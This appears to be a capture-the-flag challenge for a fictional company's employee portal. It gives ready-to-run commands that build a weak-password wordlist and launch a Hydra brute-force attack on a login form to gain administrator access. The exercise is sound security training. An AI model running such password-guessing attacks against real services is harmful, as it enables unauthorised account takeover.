NEXUS Corp Public Employee Access

NEXUS Corp's employee portal is the first line of defense. Intelligence suggests that some employees are using extremely weak passwords. Your objective: gain Administrator access.

The login endpoint accepts POST requests at /level/1/login with fields username and password. Successful admin login reveals the flag.

Use Hydra to brute-force the login. Since the target runs behind a tunnel, create a short custom wordlist with the most common weak passwords — wordlists with millions of entries will hit connection limits before finding the answer.

# Step 1 — Create your wordlist
cat > wordlist.txt << 'EOF'
123456
password
12345
qwerty
letmein
admin
welcome
monkey
dragon
master
EOF

# Step 2 — Launch the attack
hydra -l admin -P wordlist.txt TARGET https-post-form
  "/level/1/login:username=^USER^&password=^PASS^:S=Administrator"
  -V -t 1 -f
